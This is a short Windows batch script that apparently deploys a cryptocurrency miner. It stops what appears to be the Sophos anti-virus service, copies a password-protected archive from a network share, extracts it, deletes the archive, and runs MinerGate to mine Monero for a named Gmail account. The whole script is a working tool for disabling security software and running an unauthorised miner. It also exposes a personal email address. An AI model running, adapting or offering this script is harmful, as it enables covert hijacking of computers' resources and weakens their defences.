REM Set your working directories below.
set sourceDir=%USERPROFILE%\tools
set fileName=MG4.04.7z

net stop SAVService

IF EXIST %USERPROFILE%\MinerGate-cli-4.04-win64 rmdir /S /Q %USERPROFILE%\MinerGate-cli-4.04-win64

xcopy "\\sulza\hoffi\%fileName%" "%USERPROFILE%" /y

cd %USERPROFILE%
7z x %USERPROFILE%\%fileName% -pfoobar -o%USERPROFILE%

del %USERPROFILE%\%fileName%

cmd /K "%USERPROFILE%\MinerGate-cli-4.04-win64\minergate-cli.exe -user ev.fools@gmail.com xmr"